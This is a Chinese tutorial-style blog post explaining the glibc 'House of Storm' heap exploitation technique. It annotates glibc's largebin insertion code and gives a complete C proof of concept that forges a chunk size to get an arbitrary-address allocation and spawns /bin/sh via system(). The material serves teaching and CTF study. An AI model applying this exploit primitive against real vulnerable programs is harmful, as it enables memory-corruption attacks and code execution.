
# House of storm 原理及利用


                                阅读量   
                                **434816**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/203096/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203096/t010e4e0736743495c7.jpg)](./img/203096/t010e4e0736743495c7.jpg)



## 漏洞产生条件及危害

`House_of_storm`是一种结合了`unsorted_bin_attack`和`Largebin_attack`的攻击技术,其基本原理和`Largebin_attack`类似，但是不同的是`Largebin_attack`只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而`House_of_storm`则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大。`House_of_storm`虽然危害之大，但是其条件也是非常的苛刻。<br>
漏洞利用条件:<br>
1.需要攻击者在`largebin`和`unsorted_bin`中分别布置一个chunk 这两个chunk需要在归位之后处于同一个`largebin`的index中且`unsortedbin`中的chunk要比`largebin`中的大<br>
2.需要`unsorted_bin`中的`bk指针`可控<br>
3.需要`largebin`中的`bk指针和bk_nextsize`指针可控

相较于`Largebin_attack`来说 攻击需要的条件多出了一条“unsorted_bin中的bk指针可控” 但是基本上程序如果`Largebin_attack`条件满足 基本代表存在UAF漏洞 那么多控制一个bk指针应该也不是什么难事..



## 原理及源码分析

> 这里仅对漏洞出现的部分源码进行解释 详细的可以翻看我的`Largebin_attack详解`

漏洞出现在 将一个large_chunk准备从unsortedbin中归位到large_bin的过程中

代码背景介绍: 攻击者在Large_bin中已经布置好了chunk 在上文中该chunk被变量fwd指代,需要插入的chunk用变量victim指代<br>
为了让源码更易读 将需要插入的chunk用unsorted_bin来指代 将在large_bin中的chunk用large_bin来指代<br>
现在假设攻击者设置 large_bin-&gt;bk=stack1 large_bin-&gt;bk_nextsize=stack2

```
else 
    {
        // unsorted_bin-&gt;fd_nextsize = large_bin;
        victim-&gt;fd_nextsize = fwd;
        // unsorted_bin-&gt;bk_nextsize = stack2;
        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
        // stack2 = unsorted_bin;
        fwd-&gt;bk_nextsize = victim;
        // stack2-&gt;fd_nextsize = victim;
        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
    }
    // bck=stack1;
    bck = fwd-&gt;bk;
    if (bck-&gt;fd != fwd)
        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
    }
    ...
    mark_bin (av, victim_index);
    // unsorted_bin-&gt;bk = stack1;
    victim-&gt;bk = bck;
    // unsorted_bin-&gt;fd = large_bin;
    victim-&gt;fd = fwd;
    // stack2 = victim;
    fwd-&gt;bk = victim;
    // stack-&gt;fd = unsorted_bin;
    bck-&gt;fd = victim;
```

以上的代码其实就是造成`Largebin_attack`的原因—能造成两次任意地址写堆地址 `House_of_storm`从根本上也是写堆地址，但是攻击者可以利用巧妙的构造`把这个堆地址伪造成size字段`。

通过以前的知识可以知道`unsorted_bin_attack`的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个`size字段`，因为只有首先有了`size字段`Glibc才会确认这是个chunk结构 才会有后续的验证。

但是目前的情况因为我们不能去对应的地址伪造chunk(废话…你都能去目标地址伪造chunk了..任意地址写还有啥意义..直接写不就好了)，那么首要目标就是利用`Largebin_attack`在目标地址-8的位置上写出来一个`size`，其次就是对Glibc检验的绕过。明确了任务 下面就配合实例来具体讲解一下怎么构造



## 实例

这里先直接给出完整利用的代码 后续再拆开进行分块分析

```
// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
struct {
    char chunk_head[0x10];
    char content[0x10];
}fake;

int main(void)
{
    unsigned long *large_bin,*unsorted_bin;
    unsigned long *fake_chunk;
    char *ptr;

    unsorted_bin=malloc(0x418);
    malloc(0X18);
    large_bin=malloc(0x408);
    malloc(0x18);

    free(large_bin);
    free(unsorted_bin);
    unsorted_bin=malloc(0x418);
    free(unsorted_bin);

    fake_chunk=((unsigned long)fake.content)-0x10;
    unsorted_bin[0]=0;
    unsorted_bin[1]=(unsigned long)fake_chunk;

    large_bin[0]=0;
    large_bin[1]=(unsigned long)fake_chunk+8;
    large_bin[2]=0;
    large_bin[3]=(unsigned long)fake_chunk-0x18-5;

    ptr=malloc(0x48);
    strncpy(ptr, "/bin/sh", 0x48 - 1);
    system(fake.content);
}
```

```
struct {
    char chunk_head[0x10];
    char content[0x10];
}fake;
```

这里我为了方便，就直接使用结构体来设置一个随机地址。当然，使用栈上的空间也是可行的。

```
unsigned long *large_bin,*unsorted_bin;
    unsigned long *fake_chunk;
    char *ptr;

    unsorted_bin=malloc(0x418);
    malloc(0X18);
    large_bin=malloc(0x408);
    malloc(0x18);

    free(large_bin);
    free(unsorted_bin);
    unsorted_bin=malloc(0x418);
    free(unsorted_bin);
```

这一部分主要是变量定义，以及后续的malloc两个large_chunk的操作 最后让两个chunk达成利用条件 即`一个large_chunk在large_bin中(chunk large_bin)和一个large_chunk在unsorted_bin中(chunk unsorted_bin)`

```
fake_chunk=((unsigned long)fake.content)-0x10;
    unsorted_bin[0]=0;
    unsorted_bin[1]=(unsigned long)fake_chunk;

    large_bin[0]=0;
    large_bin[1]=(unsigned long)fake_chunk+8;
    large_bin[2]=0;
    large_bin[3]=(unsigned long)fake_chunk-0x18-5;
```

这一段代码就是在模拟攻击者控制各个指针的值了，这里可能会有很多人迷惑:为什么`large_bin[3]=(unsigned long)fake_chunk-0x18-5;`,即控制`large_bin-&gt;bk_nextsize=(unsigned long)fake_chunk-0x18-5;`.其实这一步就是`House_of_storm`的精髓所在——`伪造size`,下面我们来借助源码分析下究竟这样设置会发生什么样的奇妙反应。

还是上面的那段源码 我们拿过来

```
else 
    {
        // unsorted_bin-&gt;fd_nextsize=large_bin;
        victim-&gt;fd_nextsize = fwd;
        // unsorted_bin-&gt;bk_nextsize=fake_chunk-0x18-5;
        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
        // fake_chunk-0x18-5=unsorted_bin；
        fwd-&gt;bk_nextsize = victim;
        // fake_chunk-0x18+0x18-5=victim;
        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
    }
    // bck=fake_chunk+8
    bck = fwd-&gt;bk;
    if (bck-&gt;fd != fwd)
        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
    }
    ...
    mark_bin (av, victim_index);
    // unsorted_bin-&gt;bk=fake_chunk+8
    victim-&gt;bk=bck;
    // unsorted_bin-&gt;fd=large_bin;
    victim-&gt;fd = fwd;
    // fake_chunk+8=victim;
    fwd-&gt;bk = victim;
    // fake_chunk+8-8=victim;
    bck-&gt;fd = victim;
```

这段代码中构造最为巧妙的是这部分

```
// fake_chunk-0x18+0x18-5=victim;
        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
```

如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话..减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在`size字段`上面的就正好是0x55！至此，攻击者伪造chunk的目的已经达到了。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。

```
ptr=malloc(0x48);
    strncpy(ptr, "/bin/sh", 0x48 - 1);
    system(fake.content);
```

后续这段就是在验证攻击是否完成了。当成功申请到chunk的时候，攻击者正好可以拿到结构体中的`content`字段 我们利用申请的chunk进行赋值 用结构体来执行命令验证确实是同一个地址

最后的执行截图

[![](./img/203096/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/04/14/JpJpwj.png)

至于为什么会出现这个`段错误(核心已转储)` 其实就是这次执行的时候堆的起始地址是从0x56…开始的 也就是chunk不匹配了 程序就直接crash了..



## 后记

其实这也是我琢磨了看了很久源码才理解出来的 其中肯定有一些不成熟的想法和错误的理论 欢迎各位师傅们斧正
